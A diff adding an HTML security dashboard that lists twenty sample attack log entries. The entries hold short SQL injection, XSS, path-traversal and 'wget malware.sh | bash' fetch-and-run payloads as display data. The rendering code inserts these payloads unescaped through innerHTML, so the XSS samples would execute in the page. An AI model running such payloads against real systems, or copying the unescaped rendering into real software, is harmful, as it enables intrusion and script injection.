@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Attack Logs Dashboard</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0f1117;
+      color: #e2e8f0;
+      min-height: 100vh;
+      padding: 24px;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #f1f5f9;
+      margin-bottom: 4px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #64748b;
+      margin-bottom: 24px;
+    }
+
+    /* Metrics */
+    .metrics {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .metric {
+      background: #1e2130;
+      border: 1px solid #2d3148;
+      border-radius: 10px;
+      padding: 14px 16px;
+    }
+
+    .metric-label {
+      font-size: 11px;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 6px;
+    }
+
+    .metric-value {
+      font-size: 26px;
+      font-weight: 700;
+    }
+
+    .mv-red    { color: #f87171; }
+    .mv-amber  { color: #fbbf24; }
+    .mv-blue   { color: #60a5fa; }
+    .mv-green  { color: #4ade80; }
+    .mv-purple { color: #a78bfa; }
+
+    /* Controls */
+    .controls {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-bottom: 18px;
+      align-items: center;
+    }
+
+    .controls input,
+    .controls select {
+      font-size: 13px;
+      padding: 7px 12px;
+      border: 1px solid #2d3148;
+      border-radius: 8px;
+      background: #1e2130;
+      color: #e2e8f0;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .controls input { width: 200px; }
+    .controls input:focus,
+    .controls select:focus { border-color: #4f6dff; }
+
+    .btn-clear {
+      font-size: 12px;
+      padding: 7px 14px;
+      border: 1px solid #2d3148;
+      border-radius: 8px;
+      background: transparent;
+      color: #94a3b8;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-clear:hover { background: #2d3148; }
+
+    .btn-export {
+      font-size: 12px;
+      padding: 7px 14px;
+      border: 1px solid #4f6dff;
+      border-radius: 8px;
+      background: #4f6dff;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.15s;
+      margin-left: auto;
+    }
+    .btn-export:hover { background: #3b56e0; }
+
+    /* Table */
+    .table-card {
+      background: #1e2130;
+      border: 1px solid #2d3148;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+
+    thead {
+      background: #16192a;
+    }
+
+    th {
+      padding: 11px 14px;
+      text-align: left;
+      font-size: 11px;
+      font-weight: 600;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      border-bottom: 1px solid #2d3148;
+      white-space: nowrap;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    th:hover { color: #94a3b8; }
+
+    th .sort-icon { margin-left: 4px; opacity: 0.5; }
+    th.sorted .sort-icon { opacity: 1; color: #60a5fa; }
+
+    td {
+      padding: 10px 14px;
+      border-bottom: 1px solid #1a1d2e;
+      vertical-align: middle;
+    }
+
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #252840; }
+
+    .mono {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 12px;
+    }
+
+    /* Badges */
+    .badge {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 600;
+      padding: 3px 9px;
+      border-radius: 99px;
+    }
+
+    .b-critical { background: #3b1212; color: #f87171; border: 1px solid #7f1d1d; }
+    .b-high     { background: #3b1f0d; color: #fb923c; border: 1px solid #7c2d12; }
+    .b-medium   { background: #332b00; color: #fbbf24; border: 1px solid #713f12; }
+    .b-low      { background: #0f2a1a; color: #4ade80; border: 1px solid #14532d; }
+
+    .t-brute { background: #2a1630; color: #d8b4fe; border: 1px solid #6b21a8; }
+    .t-sqli  { background: #3b1212; color: #fca5a5; border: 1px solid #7f1d1d; }
+    .t-xss   { background: #332b00; color: #fde68a; border: 1px solid #713f12; }
+    .t-ddos  { background: #0d1f3b; color: #93c5fd; border: 1px solid #1e3a6e; }
+    .t-rce   { background: #3b0d24; color: #f9a8d4; border: 1px solid #831843; }
+    .t-recon { background: #1a1d2e; color: #94a3b8; border: 1px solid #334155; }
+
+    /* Status */
+    .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .dot-blocked { background: #f87171; box-shadow: 0 0 6px #f87171aa; }
+    .dot-alerted { background: #fbbf24; box-shadow: 0 0 6px #fbbf24aa; }
+    .dot-passed  { background: #4ade80; box-shadow: 0 0 6px #4ade80aa; }
+
+    /* Payload cell */
+    .payload-cell {
+      max-width: 180px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      color: #64748b;
+    }
+
+    /* Pagination */
+    .pagination {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      border-top: 1px solid #2d3148;
+      font-size: 12px;
+      color: #64748b;
+    }
+
+    .pg-btns { display: flex; gap: 6px; }
+
+    .pg-btn {
+      font-size: 12px;
+      padding: 5px 12px;
+      border: 1px solid #2d3148;
+      border-radius: 6px;
+      background: transparent;
+      color: #94a3b8;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .pg-btn:hover:not(:disabled) { background: #2d3148; }
+    .pg-btn:disabled { opacity: 0.3; cursor: default; }
+
+    /* Empty state */
+    .empty {
+      padding: 40px;
+      text-align: center;
+      color: #475569;
+      font-size: 14px;
+    }
+
+    /* Scrollable on small screens */
+    .table-scroll { overflow-x: auto; }
+
+    /* Live pulse */
+    .live-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      color: #4ade80;
+      background: #0f2a1a;
+      border: 1px solid #14532d;
+      border-radius: 99px;
+      padding: 3px 10px;
+      margin-bottom: 24px;
+    }
+
+    .live-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #4ade80;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%       { opacity: 0.4; transform: scale(0.85); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="live-badge"><div class="live-dot"></div> Live monitoring</div>
+  <h1>Attack Logs</h1>
+  <p class="subtitle">Security event log — all inbound threat activity</p>
+
+  <div class="metrics" id="metrics"></div>
+
+  <div class="controls">
+    <input type="text" id="search" placeholder="Search IP, type, target..." oninput="resetAndDraw()">
+    <select id="sev" onchange="resetAndDraw()">
+      <option value="">All severities</option>
+      <option>Critical</option>
+      <option>High</option>
+      <option>Medium</option>
+      <option>Low</option>
+    </select>
+    <select id="type" onchange="resetAndDraw()">
+      <option value="">All types</option>
+      <option value="SQLi">SQL Injection</option>
+      <option value="XSS">XSS</option>
+      <option value="DDoS">DDoS</option>
+      <option value="Brute">Brute Force</option>
+      <option value="RCE">RCE</option>
+      <option value="Recon">Recon</option>
+    </select>
+    <select id="status" onchange="resetAndDraw()">
+      <option value="">All statuses</option>
+      <option>Blocked</option>
+      <option>Alerted</option>
+      <option>Passed</option>
+    </select>
+    <button class="btn-clear" onclick="clearFilters()">Clear</button>
+    <button class="btn-export" onclick="exportCSV()">Export CSV</button>
+  </div>
+
+  <div class="table-card">
+    <div class="table-scroll">
+      <table>
+        <thead>
+          <tr>
+            <th onclick="sortBy('id')">#<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('ts')">Timestamp<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('ip')">Source IP<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('target')">Target<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('type')">Attack type<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('sev')">Severity<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('status')">Status<span class="sort-icon">↕</span></th>
+            <th onclick="sortBy('country')">Country<span class="sort-icon">↕</span></th>
+            <th>Payload</th>
+          </tr>
+        </thead>
+        <tbody id="tbody"></tbody>
+      </table>
+    </div>
+    <div class="pagination">
+      <span id="pg-info"></span>
+      <div class="pg-btns">
+        <button class="pg-btn" id="btn-prev" onclick="changePage(-1)">← Prev</button>
+        <button class="pg-btn" id="btn-next" onclick="changePage(1)">Next →</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const LOGS = [
+    {id:1,  ts:"2026-04-14 09:01:32", ip:"185.220.101.47",  target:"/login",        type:"Brute",  sev:"High",     status:"Blocked", country:"RU", payload:"POST /login x520 attempts"},
+    {id:2,  ts:"2026-04-14 09:03:14", ip:"45.142.212.18",   target:"/api/users",    type:"SQLi",   sev:"Critical", status:"Blocked", country:"CN", payload:"' OR 1=1--"},
+    {id:3,  ts:"2026-04-14 09:05:47", ip:"91.108.4.100",    target:"/search",       type:"XSS",    sev:"Medium",   status:"Alerted", country:"DE", payload:"<script>alert(1)<\/script>"},
+    {id:4,  ts:"2026-04-14 09:07:03", ip:"194.165.16.11",   target:"/",             type:"DDoS",   sev:"Critical", status:"Blocked", country:"IR", payload:"SYN flood 92k req/s"},
+    {id:5,  ts:"2026-04-14 09:10:22", ip:"104.248.232.55",  target:"/admin",        type:"Recon",  sev:"Low",      status:"Alerted", country:"US", payload:"Nmap scan 0-65535"},
+    {id:6,  ts:"2026-04-14 09:13:58", ip:"77.83.247.7",     target:"/upload",       type:"RCE",    sev:"Critical", status:"Blocked", country:"UA", payload:"cmd.php shell upload"},
+    {id:7,  ts:"2026-04-14 09:15:30", ip:"185.220.102.8",   target:"/login",        type:"Brute",  sev:"High",     status:"Blocked", country:"NL", payload:"POST /login x310 attempts"},
+    {id:8,  ts:"2026-04-14 09:17:04", ip:"62.210.115.8",    target:"/api/orders",   type:"SQLi",   sev:"High",     status:"Blocked", country:"FR", payload:"UNION SELECT * FROM users"},
+    {id:9,  ts:"2026-04-14 09:19:45", ip:"5.188.206.14",    target:"/comment",      type:"XSS",    sev:"Medium",   status:"Passed",  country:"RU", payload:"<img src=x onerror=alert(1)>"},
+    {id:10, ts:"2026-04-14 09:21:11", ip:"103.253.145.5",   target:"/checkout",     type:"SQLi",   sev:"Critical", status:"Blocked", country:"IN", payload:"'; DROP TABLE orders--"},
+    {id:11, ts:"2026-04-14 09:23:00", ip:"45.14.48.200",    target:"/",             type:"DDoS",   sev:"High",     status:"Alerted", country:"BR", payload:"UDP flood 40k req/s"},
+    {id:12, ts:"2026-04-14 09:25:37", ip:"79.137.192.9",    target:"/admin/config", type:"RCE",    sev:"Critical", status:"Blocked", country:"PL", payload:"../../etc/passwd"},
+    {id:13, ts:"2026-04-14 09:27:59", ip:"185.220.101.33",  target:"/wp-admin",     type:"Brute",  sev:"Medium",   status:"Blocked", country:"RU", payload:"POST wp-login x200"},
+    {id:14, ts:"2026-04-14 09:29:14", ip:"92.118.35.8",     target:"/",             type:"Recon",  sev:"Low",      status:"Passed",  country:"TR", payload:"Shodan crawler"},
+    {id:15, ts:"2026-04-14 09:31:42", ip:"144.76.45.22",    target:"/api/data",     type:"XSS",    sev:"High",     status:"Alerted", country:"DE", payload:"javascript:alert(document.cookie)"},
+    {id:16, ts:"2026-04-14 09:34:05", ip:"212.119.34.100",  target:"/login",        type:"SQLi",   sev:"Critical", status:"Blocked", country:"RO", payload:"admin'--"},
+    {id:17, ts:"2026-04-14 09:36:27", ip:"31.13.90.44",     target:"/",             type:"DDoS",   sev:"Critical", status:"Blocked", country:"CN", payload:"HTTP flood 210k req/s"},
+    {id:18, ts:"2026-04-14 09:38:50", ip:"5.34.180.195",    target:"/shell.php",    type:"RCE",    sev:"Critical", status:"Blocked", country:"AZ", payload:"wget malware.sh | bash"},
+    {id:19, ts:"2026-04-14 09:41:09", ip:"83.97.20.86",     target:"/profile",      type:"XSS",    sev:"Low",      status:"Passed",  country:"IT", payload:"<b onmouseover=alert(1)>"},
+    {id:20, ts:"2026-04-14 09:43:31", ip:"104.156.155.11",  target:"/reset",        type:"Brute",  sev:"Medium",   status:"Alerted", country:"US", payload:"Token enumeration x90"},
+  ];
+
+  const SEV_ORDER = {Critical:0, High:1, Medium:2, Low:3};
+  let page = 1;
+  const PER_PAGE = 10;
+  let sortKey = 'id';
+  let sortDir = 1;
+
+  function getFiltered() {
+    const q     = document.getElementById('search').value.toLowerCase();
+    const sev   = document.getElementById('sev').value;
+    const type  = document.getElementById('type').value;
+    const stat  = document.getElementById('status').value;
+    return LOGS.filter(r =>
+      (!q    || r.ip.includes(q) || r.type.toLowerCase().includes(q) || r.target.toLowerCase().includes(q) || r.country.toLowerCase().includes(q) || r.payload.toLowerCase().includes(q)) &&
+      (!sev  || r.sev === sev) &&
+      (!type || r.type === type) &&
+      (!stat || r.status === stat)
+    ).sort((a, b) => {
+      let av = a[sortKey], bv = b[sortKey];
+      if (sortKey === 'sev') { av = SEV_ORDER[av]; bv = SEV_ORDER[bv]; }
+      return av < bv ? -sortDir : av > bv ? sortDir : 0;
+    });
+  }
+
+  function sevClass(s)    { return {Critical:'b-critical',High:'b-high',Medium:'b-medium',Low:'b-low'}[s]||'b-low'; }
+  function typeClass(t)   { return {Brute:'t-brute',SQLi:'t-sqli',XSS:'t-xss',DDoS:'t-ddos',RCE:'t-rce',Recon:'t-recon'}[t]||'t-recon'; }
+  function dotClass(s)    { return {Blocked:'dot-blocked',Alerted:'dot-alerted',Passed:'dot-passed'}[s]||'dot-passed'; }
+
+  function draw() {
+    const data  = getFiltered();
+    const total = data.length;
+    const start = (page - 1) * PER_PAGE;
+    const slice = data.slice(start, start + PER_PAGE);
+
+    const blocked  = data.filter(r => r.status === 'Blocked').length;
+    const critical = data.filter(r => r.sev === 'Critical').length;
+    const alerted  = data.filter(r => r.status === 'Alerted').length;
+    const passed   = data.filter(r => r.status === 'Passed').length;
+
+    document.getElementById('metrics').innerHTML = `
+      <div class="metric"><div class="metric-label">Total events</div><div class="metric-value mv-blue">${total}</div></div>
+      <div class="metric"><div class="metric-label">Blocked</div><div class="metric-value mv-red">${blocked}</div></div>
+      <div class="metric"><div class="metric-label">Critical</div><div class="metric-value mv-red">${critical}</div></div>
+      <div class="metric"><div class="metric-label">Alerted</div><div class="metric-value mv-amber">${alerted}</div></div>
+      <div class="metric"><div class="metric-label">Passed</div><div class="metric-value mv-green">${passed}</div></div>
+    `;
+
+    document.getElementById('tbody').innerHTML = slice.length ? slice.map(r => `
+      <tr>
+        <td class="mono" style="color:#475569">${r.id}</td>
+        <td class="mono" style="color:#475569;white-space:nowrap">${r.ts}</td>
+        <td class="mono">${r.ip}</td>
+        <td class="mono" style="color:#94a3b8">${r.target}</td>
+        <td><span class="badge ${typeClass(r.type)}">${r.type}</span></td>
+        <td><span class="badge ${sevClass(r.sev)}">${r.sev}</span></td>
+        <td>
+          <span class="status">
+            <span class="dot ${dotClass(r.status)}"></span>${r.status}
+          </span>
+        </td>
+        <td style="color:#94a3b8">${r.country}</td>
+        <td class="mono payload-cell" title="${r.payload}">${r.payload}</td>
+      </tr>
+    `).join('') : `<tr><td colspan="9" class="empty">No events match the current filters.</td></tr>`;
+
+    const totalPages = Math.max(1, Math.ceil(total / PER_PAGE));
+    document.getElementById('pg-info').textContent = `Showing ${Math.min(start+1,total)}–${Math.min(start+PER_PAGE,total)} of ${total} events`;
+    document.getElementById('btn-prev').disabled = page <= 1;
+    document.getElementById('btn-next').disabled = page >= totalPages;
+
+    document.querySelectorAll('th').forEach(th => th.classList.remove('sorted'));
+  }
+
+  function resetAndDraw() { page = 1; draw(); }
+
+  function changePage(d) {
+    const total = getFiltered().length;
+    const maxP  = Math.max(1, Math.ceil(total / PER_PAGE));
+    page = Math.min(maxP, Math.max(1, page + d));
+    draw();
+  }
+
+  function sortBy(key) {
+    if (sortKey === key) sortDir *= -1;
+    else { sortKey = key; sortDir = 1; }
+    page = 1;
+    draw();
+  }
+
+  function clearFilters() {
+    document.getElementById('search').value = '';
+    document.getElementById('sev').value    = '';
+    document.getElementById('type').value   = '';
+    document.getElementById('status').value = '';
+    resetAndDraw();
+  }
+
+  function exportCSV() {
+    const data = getFiltered();
+    const headers = ['ID','Timestamp','Source IP','Target','Attack Type','Severity','Status','Country','Payload'];
+    const rows = data.map(r => [r.id, r.ts, r.ip, r.target, r.type, r.sev, r.status, r.country, `"${r.payload.replace(/"/g,'""')}"`].join(','));
+    const csv = [headers.join(','), ...rows].join('\n');
+    const a = document.createElement('a');
+    a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+    a.download = 'attack_logs.csv';
+    a.click();
+  }
+
+  draw();
+</script>
+</body>
+</html>
